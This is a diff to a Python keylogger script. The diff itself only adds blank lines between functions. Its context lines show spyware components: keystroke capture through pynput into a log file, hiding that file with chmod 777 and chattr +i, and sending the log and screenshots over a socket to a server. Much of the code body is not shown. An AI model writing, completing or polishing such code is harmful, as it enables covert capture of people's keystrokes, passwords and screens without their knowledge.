@@ -6,6 +6,7 @@ from pynput.keyboard import Key, Listener
 def get_os():
     return platform.system()
 
+
 # Function to configure the logging file
 def setup_logging_file(filename):
     logging.basicConfig(
@@ -15,6 +16,7 @@ def setup_logging_file(filename):
         format='%(asctime)s %(message)s',
         level=logging.DEBUG
     )
+
 
 # Function to hide the file
 def hide_file(filename):
@@ -26,9 +28,11 @@ def hide_file(filename):
         os.system(f'chmod 777 {filename}')
         os.system(f'chattr +i {filename}')
 
+
 # Function to log the key pressed
 def listen_keyboard(key):
     logging.info(str(key))
+
 
 # Function to send the log file to the server
 def send_log_file(filename, host, port, last_position):
@@ -49,6 +53,7 @@ def send_log_file(filename, host, port, last_position):
     except socket.error:
         print('Server unreachable ! The log file will be sent later')
         return last_position
+
 
 # Function to take a screenshot
 def take_screenshot(host, port):
@@ -82,6 +87,7 @@ def start_listener(filename, host, port, capture_duration, delay_send_log, last_
         except KeyboardInterrupt:
             listener.stop()
 
+
 def main():
     host = 'localhost'
     port = 9809
@@ -95,6 +101,7 @@ def main():
     start_time = time.time()
     delay_send_log = 10
     start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time)
+
 
 if __name__ == '__main__':
     main()
